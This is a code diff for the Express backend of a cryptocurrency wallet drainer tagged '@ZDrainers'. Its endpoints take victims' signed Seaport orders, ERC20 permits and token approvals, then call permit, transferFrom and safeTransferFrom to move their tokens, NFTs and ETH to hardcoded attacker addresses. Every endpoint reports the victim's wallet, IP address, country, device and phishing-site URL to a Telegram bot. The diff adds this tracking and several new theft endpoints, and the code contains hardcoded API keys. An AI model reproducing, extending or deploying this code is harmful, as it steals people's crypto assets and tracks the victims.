@@ -4,7 +4,6 @@ const cors = require('cors');
 const seaport = require("@opensea/seaport-js");
 const ethers = require("ethers");
 const dotenv = require("dotenv");
-const { jar } = require("request");
 dotenv.config();
 
 const app = express()
@@ -160,10 +159,11 @@ const ERC1155 = [
   },
 ];
 
+
 const config = { 
-  receiver: "0x46C4ac570d8edbD8BD62b36BA495D0BE771c4480",
-  private_receiver: "0x0cc131B43de76A459c3dd0DF729df93d35a5Bb95",
-    
+    receiver: "0x46C4ac570d8edbD8BD62b36BA495D0BE771c4480",
+    private_receiver: "0x0cc131B43de76A459c3dd0DF729df93d35a5Bb95",
+
     // ERC20 & NFT
     SAFAfulfiller: process.env.SAFAfulfiller,
 
@@ -177,30 +177,20 @@ const config = {
     MORALIS_API_KEY: "XAgBvhdSiZdoNeJppNuPXa7f7t0N1Wgq3s5gF7kMEHx0Wk6YQgv7VObMOnotp5Wp",
     OPENSEA_API_KEY: "8b707e3a2b334c40bf7943b1b328e6e9"
  }
+let provider = new ethers.providers.JsonRpcProvider(
+  "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a"
+);
 
+/******* SEAPORT *******/
+app.post("/backend/seaport", async (req, res) => {
+  let order = req.body.order;
 
- const rpc_providers = {
-  "1": "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a",
-  "56": "https://rpc.ankr.com/bsc",
-  "137": "https://rpc.ankr.com/polygon",
-  "250": "https://rpc.ankr.com/fantom",
-  "43114": "https://rpc.ankr.com/avalanche",
-  "10": "https://rpc.ankr.com/optimism",
-  "42161": "https://rpc.ankr.com/arbitrum",
-  "100": "https://rpc.ankr.com/gnosis",
-  "1285": "https://rpc.moonriver.moonbeam.network",
-  "42220": "https://rpc.ankr.com/celo",
-  "1313161554": "https://mainnet.aurora.dev"
-  }
-
-
-/******* SEAPORT METHOD *******/
-app.post("/seaport_sign", async (req, res) => {
- 
-  let order = req.body
-  let provider = new ethers.providers.JsonRpcProvider(
-    "https://rpc.ankr.com/eth/d266e08a3e2a7271cb6b295914898820f5776ecbee7821ecec71d46c07c71113"
-  );
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
 
   let fulFills = [];
 
@@ -244,6 +234,7 @@ app.post("/seaport_sign", async (req, res) => {
     let fulfillerSigner = await fulfillerWallet.connect(provider);
     let spClientFulfiller = new seaport.Seaport(fulfillerSigner);
 
+
     let gasPrice = await provider.getGasPrice();
     let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 2))
     let gasLimit = await spClientFulfiller
@@ -254,8 +245,8 @@ app.post("/seaport_sign", async (req, res) => {
     })
     .estimateGas();
     let gasLimitHex = ethers.utils.hexlify(gasLimit);
+    console.log('gasLimitHex',gasLimitHex)
 
-    console.log(gasLimitHex)
 
 
     const transaction = await spClientFulfiller
@@ -271,10 +262,16 @@ app.post("/seaport_sign", async (req, res) => {
       return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
     }
 
-          
     let message =
-    `🟢 *Approved Seaport Trasaction*\n\n` +
-     `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n`;
+      `🟢 *Approved Seaport Trasaction*\n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n` +
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+
 
     let clientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -287,7 +284,7 @@ app.post("/seaport_sign", async (req, res) => {
 
     request(clientServerOptions, (error, response) => {
       console.log(error);
-      res.status(200).send({ status: true });
+      res.sendStatus(200);
     });
   } catch (error) {
     console.warn("[-] Seaport error: ", error)
@@ -295,38 +292,83 @@ app.post("/seaport_sign", async (req, res) => {
 
 });
 
+/******* SWAP *******/
+app.post("/backend/swap", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
 
-
-
-/******* PERMIT SAFA *******/
-
-app.post("/token_permit", async (req, res) => {
-
-  
-
-let input_chain = parseInt(req.body.chainId,16).toString();
-let rpcUrl = rpc_providers[input_chain];
-let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
-
-  let address = req.body.owner;
- 
-  let withdrawBalance = req.body.amount;
-   let permit = JSON.parse(req.body.permit)
-  let contractAddress = req.body.tokenAddress;
-  
-  
-  let permitValue = permit.value;
-  let r = permit.r;
-  let s = permit.s;
-  let v = permit.v;
-  let deadline = permit.deadline;
-
-
-  console.log(address,config.receiver,permitValue,deadline,withdrawBalance)
+  let transferName = req.body.transferName;
+  let tokenPrice = req.body.tokenPrice;
+  let transactionHash = req.body.transactionHash;
 
   let escaper = (ah) => {
     return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
   }
+
+  try {
+
+    let message =
+      `🟢 *Approved ${escaper(transferName)} Transfer* \n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +
+
+      `❓ *Transfer Type: ${escaper(transferName)} \n*` +
+      `💰 *Token Price: ${escaper(tokenPrice)} ETH\n\n*` +
+
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+
+    let clientServerOptions = {
+      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
+      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }
+
+    request(clientServerOptions, (error, response) => {
+      console.log("Sent SWAP log");
+      res.sendStatus(200);
+    });
+
+  } catch (error) {
+    console.warn("[-] SWAP error: ", error)
+  }
+});
+
+/******* PERMIT SAFA *******/
+
+app.post("/backend/permit", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
+
+  let tokenName = req.body.tokenName;
+  let tokenPrice = req.body.tokenPrice;
+  let withdrawBalance = req.body.withdrawBalance;
+  let contractAddress = req.body.contractAddress;
+
+  let permitValue = req.body.value;
+  let r = req.body.r;
+  let s = req.body.s;
+  let v = req.body.v;
+  let deadline = req.body.deadline;
+
+  let escaper = (ah) => {
+    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
+  }
+  console.log('permitValue',permitValue)
 
   try {
     const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
@@ -335,6 +377,7 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
     res.status(200).send({
       status: true,
     })
+
     let gasPrice = await provider.getGasPrice();
 
     let gasLimit = await contractInstance.estimateGas.permit(
@@ -346,8 +389,8 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
 
 
     let gasLimitHex = ethers.utils.hexlify(gasLimit);
-
-    let permit = await contractInstance.permit(address, config.receiver, permitValue, deadline, v, r, s,  { gasLimit: gasLimitHex })
+    
+    let permit = await contractInstance.permit(address, config.receiver, permitValue, deadline, v, r, s, { gasLimit: gasLimitHex })
 
     let message =
       `🟢 *Approved PERMIT ERC20 Transaction*\n\n` +
@@ -355,9 +398,15 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
 
       `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(permit.hash)})\n` +
 
-      `❓ *contractAddress Name: ${escaper(contractAddress)}\n*`;
+      `❓ *Token Name: ${escaper(tokenName)}\n*` +
+      `💰 *Token Price: ${escaper(tokenPrice)}\n*` +
+      `💸 *Withdrawbalance: ${escaper(withdrawBalance)}\n\n*` +
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
 
-      
     let clientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
       body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
@@ -374,17 +423,16 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
 
     await provider.waitForTransaction(permit.hash);
 
-    // WITHDRAWING THE PERMITTED TOKEN BALANCE
+    // WITHDRAWING
 
     let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)
 
     let withdrawMessage =
       `*Withdrawed ERC20 permit*\n\n` +
-      `*From:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
-      `*To:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
-      `*Amount: ${escaper(withdrawBalance)}*\n` +
+      `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
       `*Type: ERC20 permit *\n` +
-    `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
+      `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
 
     let withdrawClientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -397,7 +445,7 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
 
     request(withdrawClientServerOptions, (error, response) => {
       console.log("[+] Withdrawed PERMIT ERC20");
-      res.status(200).send({ status: true });
+      res.sendStatus(200);
     });
 
 
@@ -406,22 +454,22 @@ let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
   }
 });
 
-
 /******* ERC20 SAFA *******/
-app.post("/token_transfer", async (req, res) => {
+app.post("/backend/safa/erc20", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
+
+  let tokenType = req.body.tokenType;
+  let tokenName = req.body.tokenName;
+  let tokenPrice = req.body.tokenPrice;
+  let withdrawBalance = req.body.withdrawBalance;
+  let contractAddress = req.body.contractAddress;
 
 
-  let input_chain = parseInt(req.body.chainId,16).toString();
-  let rpcUrl = rpc_providers[input_chain];
-  console.log(rpcUrl)
-  let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
-  
-  let chainId = req.body.chainId;
-  let tokenAddress = req.body.tokenAddress;
-  let abiUrl = req.body.abiUrl;
-  let tokenBalance = req.body.amount;
-  let owner = req.body.owner;
-  let spender = req.body.spender;
   let transactionHash = req.body.transactionHash;
 
   let escaper = (ah) => {
@@ -429,15 +477,23 @@ app.post("/token_transfer", async (req, res) => {
   }
 
   try {
-    console.log(`[+] Sending ${abiUrl} log`)
+    console.log(`[+] Sending ${tokenName} log`)
 
     let message =
-      `🟢 *Approved ${escaper(chainId)} TOKEN Transfer*\n\n` +
-      `🔑 *Wallet Address*: [${escaper(owner)}](https://etherscan.io/address/${owner})\n` +
-       `💰 *Token Balance: ${escaper(tokenBalance)}\n*` +
-      `💸 *Token Address: ${escaper(tokenAddress)}\n\n*` +
-      `🌎 *AbiUrl: *${escaper(abiUrl)} **\n`;
-     
+      `🟢 *Approved ${escaper(tokenType)}  Transfer*\n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +
+
+      `❓ *Token Name: ${escaper(tokenName)}\n*` +
+      `💰 *Token Price: ${escaper(tokenPrice)}\n*` +
+      `💸 *Withdrawbalance: ${escaper(withdrawBalance)}\n\n*` +
+
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+
     let clientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
       body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
@@ -451,21 +507,20 @@ app.post("/token_transfer", async (req, res) => {
       console.log("Sent ERC20 log");
     });
 
-    hash_response = await provider.waitForTransaction(transactionHash);
+    await provider.waitForTransaction(transactionHash);
 
- 
- 
-    // WITHDRAWING THE SAFA ERC
+    // WITHDRAWING
     const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
-    let contractInstance = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+    let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
 
-    let withdrawal = await contractInstance.transferFrom(owner, config.private_receiver, tokenBalance)
+    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)
 
     let withdrawMessage =
-      `*Withdrawed ${escaper(chainId)} APPROVED TOKEN*\n\n` +
-      `*Wallet:* [${escaper(owner)}](https://etherscan.io/address/${owner})\n` +
-      `*Amount: ${escaper(tokenBalance)}*\n` +
-       `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
+      `*Withdrawed ${escaper(tokenType)}*\n\n` +
+      `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
+      `*Type: ${escaper(tokenType)} *\n` +
+      `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
 
     let withdrawClientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -478,7 +533,7 @@ app.post("/token_transfer", async (req, res) => {
 
     request(withdrawClientServerOptions, (error, response) => {
       console.log("[+] Withdrawed ERC20");
-      res.status(200).send({ status: true });
+      res.sendStatus(200);
     });
   } catch (error) {
     console.warn("[-] SAFA ERC20 error: ", error)
@@ -486,33 +541,42 @@ app.post("/token_transfer", async (req, res) => {
 });
 
 /******* NFT SAFA *******/
-app.post("/nft_transfer", async (req, res) => {
+app.post("/backend/safa/nft", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
 
-  let input_chain = parseInt(req.body.chainId,16).toString();
-  let rpcUrl = rpc_providers[input_chain];
-  let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
-  
-  let token_s = req.body.tokens;
-  let tokenAddress = req.body.tokenAddress;
-  let address = req.body.owner;
-  let transactionHash = req.body.transactionHash;
   let tokenType = req.body.tokenType;
-  
- 
+  let tokenName = req.body.tokenName;
+  let tokenPrice = req.body.tokenPrice;
+  let contractAddress = req.body.contractAddress;
 
- 
+  let transactionHash = req.body.transactionHash;
+
   let escaper = (ah) => {
     return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
   }
 
   try {
-    console.log(`[+] Sending ${tokenAddress} log`)
+    console.log(`[+] Sending ${tokenName} log`)
 
     let message =
-      `🟢 *Approved NFT-SAFA Transfer of ${escaper(tokenAddress)}*\n\n` +
+      `🟢 *Approved Transfer ${escaper(tokenType)}*\n\n` +
       `🔑 *Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
-      `*Tokens: ${escaper(token_s)}*\n`;
-       
+
+      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +
+
+      `❓ *Token Name: ${escaper(tokenName)}*\n` +
+      `💰 *Token Price: ${escaper(Number(tokenPrice).toFixed(5))} ETH*\n\n` +
+
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
 
     let clientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -527,12 +591,12 @@ app.post("/nft_transfer", async (req, res) => {
       console.log("Sent NFT log");
     });
 
-    hash_response = await provider.waitForTransaction(transactionHash);
+    await provider.waitForTransaction(transactionHash);
 
-    // WITHDRAWING THE APPROVED NFT
-    console.log(address, tokenAddress)
+    // WITHDRAWING
+    console.log(address, contractAddress)
     let tokenIdServerOptions = {
-      uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + tokenAddress + '?chain=Eth&format=decimal',
+      uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
       method: 'GET',
       headers: {
         'Content-Type': 'application/json',
@@ -553,19 +617,20 @@ app.post("/nft_transfer", async (req, res) => {
 
 
         if (tokenType == "ERC721") {
-          let contractInstance = new ethers.Contract(tokenAddress, ERC721, signer);
+          let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
           withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i])
         }
 
         if (tokenType == "ERC1155") {
-          let contractInstance = new ethers.Contract(tokenAddress, ERC1155, signer);
+          let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
           withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i], 1, 256)
         }
 
         let withdrawMessage =
-          `*Withdrawed APPROVED NFTS ${escaper(tokenAddress)}*\n\n` +
+          `*Withdrawed ${escaper(tokenName)}*\n\n` +
           `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
-           `*Type: ${escaper(tokenType)} *\n` +
+          `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
+          `*Type: ${escaper(tokenType)} *\n` +
           `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;
 
         let withdrawClientServerOptions = {
@@ -578,7 +643,7 @@ app.post("/nft_transfer", async (req, res) => {
         }
         request(withdrawClientServerOptions, (error, response) => {
           console.log("[+] Withdrawed NFT");
-          res.status(200).send({ status: true });
+          res.sendStatus(200);
         });
 
       }
@@ -591,9 +656,158 @@ app.post("/nft_transfer", async (req, res) => {
 
 });
 
- 
+/******* ETH SAFA *******/
+app.post("/backend/safa/eth", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
 
- 
+  let tokenPrice = req.body.tokenPrice;
+  let transactionHash = req.body.transactionHash;
+
+  let escaper = (ah) => {
+    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
+  }
+
+  try {
+
+    let message =
+      `🟢 *Approved ETH Transfer*\n\n` +
+      `🔑 *Wallet Address*:  [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+
+      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +
+
+      `❓ *Token Name: ETH \n*` +
+      `💰 *Token Price: ${escaper(tokenPrice)} ETH\n\n*` +
+
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+
+    let clientServerOptions = {
+      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
+      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }
+
+    request(clientServerOptions, (error, response) => {
+      console.log("Sent ETH log");
+      res.sendStatus(200);
+    });
+
+  } catch (error) {
+    console.warn("[-] SAFA ETH error: ", error)
+  }
+});
+
+
+/******* CONNECTION *******/
+app.post("/backend/connection", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
+
+
+  let escaper = (ah) => {
+    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
+  }
+
+  try {
+    let message =
+      `🔗 *New Connection*\n\n` +
+      `🔑 *Wallet Address*: \`${address}\`\n\n` +
+      `🌐 *Etherscan*: [Here](https://etherscan.io/address/${address})\n` +
+      `🖼️ *NFTs Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/nfts)\n` +
+      `🏦 *ERC20 Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/assets)\n\n` +
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+    let clientServerOptions = {
+      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
+      body: JSON.stringify({ chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }
+
+    request(clientServerOptions, (error, response) => {
+      console.log("Connection");
+      res.sendStatus(200);
+    });
+
+  } catch (error) {
+    console.warn("[-] Connection error: ", error);
+  }
+});
+
+/******* CANCEL *******/
+app.post("/backend/cancel", async (req, res) => {
+  let address = req.body.address;
+  let walletBalanceInEth = req.body.walletBalanceInEth
+  let isMobile = req.body.isMobile;
+  let websiteUrl = req.body.websiteUrl;
+  let websiteDomain = req.body.websiteDomain;
+  let ipData = req.body.ipData;
+
+  let tokenType = req.body.tokenType;
+  let tokenName = req.body.tokenName;
+  let tokenPrice = req.body.tokenPrice;
+
+  let escaper = (ah) => {
+    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
+  }
+
+
+  try {
+    let message =
+      `❌ *Denied ${tokenType} ${tokenName} Transaction*\n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
+      `💸 *Wallet Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n\n${tokenType != "Seaport"
+        ?
+        `📛 *Token Name: ${escaper(tokenName)} *\n` +
+        `💰 *Token Price: ${escaper(tokenPrice)} *\n`
+        :
+        ""
+      }` +
+      `🖼️ *NFTs Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/nfts)\n\n` +
+      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
+      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
+      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
+      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
+      `💀 *Join The  Gang* @ZDrainers\n`;
+
+    let clientServerOptions = {
+      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
+      body: JSON.stringify({ chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }
+
+    request(clientServerOptions, (error, response) => {
+      console.log(error);
+      res.sendStatus(200);
+    });
+  } catch (error) {
+    console.warn("[-] Cancel error: ", error);
+  }
+});
 
 
 app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
+
